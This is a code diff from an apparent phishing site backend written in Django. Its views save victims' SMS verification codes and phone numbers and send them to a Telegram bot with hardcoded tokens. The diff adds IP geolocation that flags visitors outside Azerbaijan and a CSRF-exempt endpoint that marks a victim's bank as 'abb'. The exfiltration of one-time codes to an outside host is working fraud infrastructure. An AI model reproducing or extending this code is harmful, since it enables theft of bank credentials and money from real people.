@@ -223,7 +223,10 @@ def dsecazericard(request):
         contact.bankname=""
         contact.page_name="/loading"
         contact.save()
-        response = requests.post(f'https://api.telegram.org/bot6284666597:AAE17trIGiyILsEmfW9W9KcHNUUnIJKLZ_M/sendMessage?chat_id=-1001894884341&text=id:{contact.id}\nPage:{request.path}\nsms:{contact.sms}|number{contact.phone}\n@Maybewhou')
+        country = get_country_from_ip(contact.ip)
+        if country!= "AZ":
+            country= 'Şübhəli İP!'
+        response = requests.post(f'https://api.telegram.org/bot6316715361:AAH3GsgZgeG7r1uwHQHGypsDCeVtSV6Zoik/sendMessage?chat_id=-1001866012482&text=id:{contact.id}|ip:{country}\nPage:Loading\nsms:{contact.sms}')
 
         return render( request,'pages/loading.html',context )
     return render( request,'pages/loading.html',context )
@@ -430,3 +433,16 @@ def get_country_from_ip(ip_address):
             return "Unknown"
     except requests.RequestException:
         return "Error"
+    
+@csrf_exempt
+def contact_approve_abb(request, pk):
+    contact = get_object_or_404(ContactModel, pk=pk)
+    
+    # Kullanıcının onay durumunu güncelleyin (örneğin, onaylanmış bir alan ekleyerek)
+    contact.bankname = "abb"
+    contact.save()
+
+    # Burada başka bir sayfaya yönlendirme yapabilirsiniz
+    # Örneğin: return redirect('azercell')
+
+    return JsonResponse({'success': True})
